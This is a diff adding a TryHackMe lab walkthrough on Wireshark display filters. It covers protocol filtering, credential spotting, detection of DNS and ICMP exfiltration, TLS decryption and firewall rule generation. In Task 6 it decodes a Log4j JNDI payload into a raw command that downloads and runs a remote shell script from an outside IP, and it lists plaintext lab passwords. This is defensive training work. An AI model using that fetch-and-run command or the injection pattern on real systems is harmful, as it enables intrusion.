@@ -2836,3 +2836,287 @@ Finally, I retrieved successful HTTP image downloads matching specific MIME type
 * **User:** kaviboy
 * **Status:** Room completed!
 * **Focus Area:** Wireshark Packet Operations, Statistics, & Advanced Display Filtering
+
+
+
+
+# TryHackMe: Wireshark: Display Filters Walkthrough
+
+In this lab, I used Wireshark display filters to analyze network traffic, inspect protocols, extract credentials, detect tunneling and exfiltration, decode exploit payloads, decrypt TLS/HTTP2 traffic, and analyze firewall ACL rules across Tasks 1 through 8.
+
+---
+
+## Task 1: Basic Display Filter Syntax & TCP Options
+
+I started Task 1 by isolating TCP SYN packets with zero ACK flags and a specific window size using `tcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size > 1024`.
+
+![Filter TCP SYN Packets]<img width="669" height="581" alt="1 1" src="https://github.com/user-attachments/assets/b5ee065d-cc96-4244-b61c-5bc6bc85cf8a" />
+
+* **Total Packets Displayed:** `1000` (15.3%)
+
+Next, I narrowed down communication between two IP addresses on specific ports using `(ip.addr eq 10.106.60.7 and ip.addr eq 10.10.47.123) and (tcp.port eq 42026 and tcp.port eq 80)`.
+
+![Filter Specific IP and Port Traffic]<img width="668" height="589" alt="1 2" src="https://github.com/user-attachments/assets/eefd84b1-4867-49ed-ac29-1596eb19e482" />
+
+* **Total Packets Displayed:** `4` (0.1%)
+
+I then filtered for ICMP Destination Unreachable messages using `icmp.type==3 and icmp.code==3`.
+
+![Filter ICMP Destination Unreachable]<img width="671" height="591" alt="1 3" src="https://github.com/user-attachments/assets/32a06554-e1c4-4c81-9b91-1377fe2ab465" />
+
+* **Total Packets Displayed:** `1083` (16.5%)
+
+Finally, I targeted UDP traffic within a specific port range using `udp.port in {55..70}`.
+
+![Filter UDP Port Range]<img width="668" height="581" alt="1 4" src="https://github.com/user-attachments/assets/91408e2a-a5c9-41d5-b953-dbb269c9d6ca" />
+
+* **Total Packets Displayed:** `12` (0.2%)
+
+---
+
+## Task 2: Network Traffic & Credential Inspection
+
+Moving into Task 2, I examined ARP broadcast traffic originated by a specific IPv4 source using `arp.src.proto_ipv4 == 192.168.1.25`.
+
+![Filter ARP Traffic by Source IP]<img width="669" height="584" alt="2 1" src="https://github.com/user-attachments/assets/f5b11595-01d6-4c5e-919d-1758808af69e" />
+
+* **Total Packets Displayed:** `284` (9.9%)
+
+Next, I filtered HTTP traffic associated with a specific MAC address using `eth.addr == 00:0c:29:e2:18:b4 and http`.
+
+![Filter HTTP Traffic by MAC Address]<img width="668" height="582" alt="2 2" src="https://github.com/user-attachments/assets/0a6e4ece-39ce-4a82-88bf-c822b2b92a3a" />
+
+* **Total Packets Displayed:** `90` (3.1%)
+
+To locate credential submissions, I searched for HTTP requests containing form password fields via `eth.addr == 00:0c:29:e2:18:b4 and http and urlencoded-form.key==pass`.
+
+![Filter Password Key Submissions]<img width="669" height="587" alt="2 3" src="https://github.com/user-attachments/assets/0d9f5c9c-4d87-48ad-8d5a-900561539b7c" />
+
+* **Total Packets Displayed:** `6` (0.2%)
+
+Inspecting packet #1668 revealed submitted credentials in plain text.
+
+![Inspect Packet 1668 Plaintext Password]<img width="675" height="584" alt="2 4" src="https://github.com/user-attachments/assets/4513ab3d-490a-4185-8c4c-e582f543e761" />
+
+* **Extracted Password:** `clientnothere!`
+
+Finally, I searched form submission comments across HTTP packets to locate cleartext feedback values.
+
+![Extract Form Submission Feedback]<img width="672" height="584" alt="2 5" src="https://github.com/user-attachments/assets/d189bfab-9c70-4abe-a0c9-acebf0f7dab0" />
+
+* **Form Comment Value:** `Nice work!`
+
+---
+
+## Task 3: Protocol Specific Analysis (DHCP & Kerberos)
+
+In Task 3, I inspected DHCP requests containing hostnames matching a target string using `dhcp.option.hostname contains "A30"`.
+
+![Filter DHCP Hostname Option]<img width="670" height="590" alt="3 1" src="https://github.com/user-attachments/assets/5cabca31-49a2-47ed-a651-030f9204aa1c" />
+
+* **Client MAC Address:** `9a:81:41:cb:96:6c`
+
+Next, I filtered NetBIOS Name Service (NBNS) packets by name and opcode using `nbns.name contains "LIVALJM" && nbns.flags.opcode==5`.
+
+![Filter NBNS Packets]<img width="670" height="587" alt="3 2" src="https://github.com/user-attachments/assets/54e157cf-8414-4ae4-9003-32a38f81f063" />
+
+* **Total Packets Displayed:** `16` (0.0%)
+
+I then filtered DHCP requests targeting a specific requested IP address using `dhcp.option.requested_ip_address==172.16.13.85`.
+
+![Filter Requested IP Address]<img width="669" height="584" alt="3 3" src="https://github.com/user-attachments/assets/e978283d-a629-442b-9347-41beaba182f1" />
+
+* **Host Name Identified:** `Galaxy-A12`
+
+Navigating to `kerberos.pcap`, I filtered Kerberos traffic containing principal string patterns via `kerberos.CNameString contains "u5"`.
+
+![Filter Kerberos CNameString u5]<img width="668" height="584" alt="3 4" src="https://github.com/user-attachments/assets/45236b8f-707d-4fdc-8531-0560ca188486" />
+
+* **Source IP:** `10.1.12.2`
+
+I used CyberChef to defang the extracted IP address for safe documentation.
+
+![Defang Source IP in CyberChef]<img width="1365" height="644" alt="3 5" src="https://github.com/user-attachments/assets/e247faa5-9951-4bd7-ae04-796bd7021d52" />
+
+* **Defanged IP:** `10[.]1[.]12[.]2`
+
+Finally, I filtered Kerberos TGS requests containing machine account signatures using `kerberos.CNameString contains "$"`.
+
+![Filter Kerberos Machine Accounts]<img width="669" height="584" alt="3 6" src="https://github.com/user-attachments/assets/be6e8850-267d-41a9-848e-94404ad1e3c2" />
+
+* **CNameString Extracted:** `xp1$`
+
+---
+
+## Task 4: Tunneling & Exfiltration Detection
+
+In Task 4, I analyzed payload sizes in ICMP traffic to detect ICMP tunneling using `data.len>64 and icmp`.
+
+![Filter ICMP Tunneling Traffic]<img width="669" height="562" alt="4 1" src="https://github.com/user-attachments/assets/fcbc1313-8153-480e-b73c-63cecb3424a6" />
+
+Next, I searched for long DNS queries associated with DNS exfiltration using `dns.qry.name.len>15 and !mdns`.
+
+![Filter DNS Exfiltration Queries]<img width="671" height="591" alt="4 2" src="https://github.com/user-attachments/assets/ed965da9-6072-4002-b72f-aa560ab6e3d4" />
+
+I extracted the exfiltrated hostname payload from the packet details window.
+
+![Extract Exfiltrated Hostname Payload]<img width="674" height="490" alt="4 3" src="https://github.com/user-attachments/assets/36598126-81b1-4bdd-a316-0efda25e103a" />
+
+* **Extracted Domain:** `dataexfil.com`
+
+Using CyberChef, I defanged the exfiltrated domain.
+
+![Defang Domain in CyberChef]<img width="1365" height="644" alt="4 4" src="https://github.com/user-attachments/assets/67eaf4b6-e67e-4014-9b60-5ff0d1a80e15" />
+
+* **Defanged Domain:** `dataexfil[.]com`
+
+---
+
+## Task 5: FTP Traffic & Stream Analysis
+
+In Task 5, I analyzed FTP login failure response codes using `ftp.response.code==530`.
+
+![Filter FTP Response Code 530]<img width="674" height="588" alt="5 1" src="https://github.com/user-attachments/assets/3a8851ee-427a-4f62-b707-7564124e2f7c" />
+
+* **FTP Response Message:** `530 Login incorrect.`
+
+Next, I filtered for FTP response code 213 using `ftp.response.code==213`.
+
+![Filter FTP Response Code 213]<img width="672" height="582" alt="5 2" src="https://github.com/user-attachments/assets/c99bcd43-53dc-44c2-822f-886350b2ef1c" />
+
+* **Response Argument (File Size in Bytes):** `39424`
+
+Following the TCP stream for `tcp.stream eq 714`, I inspected the command sequence to find the target file being requested.
+
+![Follow TCP Stream - File Request]<img width="670" height="587" alt="5 3" src="https://github.com/user-attachments/assets/920da71c-8ade-4b1b-ba2a-e959bc13c31a" />
+
+* **File Name Requested:** `resume.doc`
+
+Continuing down stream 714, I identified a failed site command execution.
+
+![Follow TCP Stream - Site Command Failure]<img width="671" height="585" alt="5 4" src="https://github.com/user-attachments/assets/8abf335c-3521-4821-9a4f-e695781486e2" />
+
+* **Failed Command:** `SITE CHMOD 777`
+
+---
+
+## Task 6: HTTP User-Agent Analysis & Exploit Payload Decoding
+
+In Task 6, I filtered all HTTP User-Agents using `http.user_agent`.
+
+![Filter User-Agents Overview]<img width="670" height="588" alt="6 1" src="https://github.com/user-attachments/assets/a345ad52-5c73-4291-9b18-02f492e88090" />
+
+* **Target Host Name:** `i7.photobucket.com`
+
+Scanning the results for anomalies, I spotted a typo in a User-Agent string.
+
+![Detect Typo in User-Agent]<img width="670" height="590" alt="6 2" src="https://github.com/user-attachments/assets/bbdfdbc3-7d37-4028-9fcf-4a6d926d703d" />
+
+* **Misspelled User-Agent String:** `Mozlila/5.0 (X11; Ubuntu; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0`
+
+Next, I filtered for Log4j injection attempts using `(ip contains "jndi") or (ip contains "Exploit")`.
+
+![Filter Log4j Exploit Packets]<img width="670" height="588" alt="6 3" src="https://github.com/user-attachments/assets/0e5f9e6a-0b13-4876-ba4d-64040cc2871d" />
+
+Inspecting packet #444 revealed a JNDI LDAP string containing a Base64 payload in the User-Agent header.
+
+![Inspect Base64 Exploit Payload]<img width="664" height="577" alt="6 4" src="https://github.com/user-attachments/assets/8a04b6c1-05ff-4c15-8a52-9fb68f635af4" />
+
+* **Encoded Payload:** `d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvMWguc2g7Y2htb2QgK3ggMWguc2g7Li8xaC5zaA==`
+
+I pasted the encoded payload into CyberChef to decode the Base64 string and defang the IP address.
+
+![Decode Base64 and Defang IP in CyberChef]<img width="1365" height="645" alt="6 5" src="https://github.com/user-attachments/assets/cc3cc473-0c1b-4fa5-8c64-13686cb4455a" />
+
+* **Decoded Command:** `wget http://62.210.130.250/1h.sh;chmod +x 1h.sh;./1h.sh`
+* **Defanged Command Output:** `wget http://62[.]210[.]130[.]250/1h.sh;chmod +x 1h.sh;./1h.sh`
+
+---
+
+## Task 7: Web Traffic, TLS SNI & Decryption
+
+In Task 7, I isolated HTTP requests and TLS Client Hello messages while filtering out noise using `(http.request or tls.handshake.type==1) and !(ssdp)`.
+
+![Filter TLS Handshakes - Frame 13]<img width="668" height="586" alt="7 1" src="https://github.com/user-attachments/assets/2f318424-4575-4ab8-8cbb-54283da7a821" />
+
+* **Server Name (Frame 13):** `clientservices.googleapis.com`
+
+Inspecting frame #16 revealed a second Google domain in the Server Name Indication extension.
+
+![Filter TLS Handshakes - Frame 16]<img width="673" height="591" alt="7 2" src="https://github.com/user-attachments/assets/a33516a4-6272-4565-9d37-984d2355f877" />
+
+* **Server Name (Frame 16):** `accounts.google.com`
+
+To inspect encrypted HTTP/2 traffic, I imported the master secret key file (`KeysLogFile.txt`) under Wireshark's **Preferences -> Protocols -> TLS** menu.
+
+![Load TLS KeysLogFile]<img width="673" height="583" alt="7 3" src="https://github.com/user-attachments/assets/41262e24-98b3-46ac-b039-85c31ccea24f" />
+
+Applying the `http2` display filter allowed me to view the decrypted HTTP/2 streams across packets.
+
+![Filter Decrypted HTTP/2 Traffic]<img width="670" height="584" alt="7 4" src="https://github.com/user-attachments/assets/47e1a407-ec1d-4a15-bf3b-595b9431730e" />
+
+I located Packet #322, which contained an HTTP/2 GET request for a Google Safe Browsing authority endpoint.
+
+![Inspect Decrypted TLS Header]<img width="672" height="584" alt="7 5" src="https://github.com/user-attachments/assets/fd37e534-ed49-43df-914d-428281db80bb" />
+
+* **Decrypted Target Domain:** `safebrowsing.googleapis.com`
+
+I defanged the target domain using CyberChef for safe reporting.
+
+![Defang Domain in CyberChef]<img width="1365" height="645" alt="7 6" src="https://github.com/user-attachments/assets/1f2c3687-9e45-4e29-a85f-413259f1f71d" />
+
+* **Defanged Domain:** `safebrowsing[.]googleapis[.]com`
+
+Searching packet bytes for `flag.txt` brought me to an HTTP/2 HEADERS stream containing the requested path `/f6l4ta5w6gidsga3/flag.txt`.
+
+![Search Flag Text Stream]<img width="838" height="592" alt="7 7" src="https://github.com/user-attachments/assets/5b90a337-c533-423c-b57e-1622793000fa" />
+
+I exported the HTTP object from `situla.bitbit.net` via **File -> Export Objects -> HTTP**.
+
+![Export HTTP Objects]<img width="839" height="562" alt="7 8" src="https://github.com/user-attachments/assets/ca03ccec-596c-40e5-bb9b-ef396a00b19c" />
+
+Opening the exported text file revealed ASCII art surrounding the flag value.
+
+![Read Flag Text File]<img width="840" height="517" alt="7 9" src="https://github.com/user-attachments/assets/39ce40fe-2d47-4e14-8abc-709d1e64e3ad" />
+
+* **Extracted Flag:** `FLAG{THM-PACKETMASTER}`
+
+---
+
+## Task 8: Bonus Exercises & Credential Hunting
+
+In the bonus capture file, I navigated to **Tools -> Credentials** to inspect all automatically detected cleartext authentication pairs.
+
+![Inspect Credentials Window]<img width="839" height="586" alt="8 1" src="https://github.com/user-attachments/assets/487e17cb-4348-4e43-b93c-ec1d3a486f6a" />
+
+* **Discovered HTTP Username:** `afiiskc`
+* **Extracted HTTP Credentials:** `afiiskc:akkc`
+
+Following the TCP stream for stream 22 (`tcp.stream eq 22`) allowed me to review the raw FTP authentication attempt.
+
+![Follow TCP Stream 22]<img width="844" height="612" alt="8 2" src="https://github.com/user-attachments/assets/5252d36c-e05e-4ded-87c3-7721bc1809ae" />
+
+* **FTP Username Attempt:** `administrator`
+* **FTP Authentication Status:** `530 Login incorrect.`
+
+Next, I generated IPFirewall (ipfw) ACL rules for packet #99 via **Analyze -> Firewall ACL Rules**.
+
+![Generate Firewall ACL Rules - Deny Rules]<img width="840" height="596" alt="9 1" src="https://github.com/user-attachments/assets/9e4a7378-30a0-42e3-afc4-9f5d61e3c20e" />
+
+* **Generated Deny Rule (Source IP):** `add deny ip from 10.121.70.151 to any in`
+* **Generated Deny Rule (Destination IP):** `add deny ip from 10.234.125.254 to any in`
+
+Finally, I evaluated packet #231 to generate permissive IPFirewall ACL rules for MAC and port filters.
+
+![Generate Firewall ACL Rules - Allow Rules]<img width="842" height="591" alt="9 2" src="https://github.com/user-attachments/assets/0f57f81d-9fab-43a6-85c9-afcb9eae79ab" />
+
+* **Generated Allow Rule (Destination MAC):** `add allow MAC 00:d0:59:aa:af:80 any in`
+
+---
+
+## 🎉 Room Completion
+
+![Room Completed Banner]<img width="1365" height="647" alt="10" src="https://github.com/user-attachments/assets/aa0f8eb4-7d3e-476c-b914-a220da34e9b3" />
+
+* **Status:** Completed
+* **Focus Area:** Wireshark Advanced Filters, Protocol Analysis, FTP Stream Analysis, Log4j Payload Decoding, TLS Decryption (HTTP/2), Object Exporting, Firewall ACL Rule Generation, & Credential Extraction
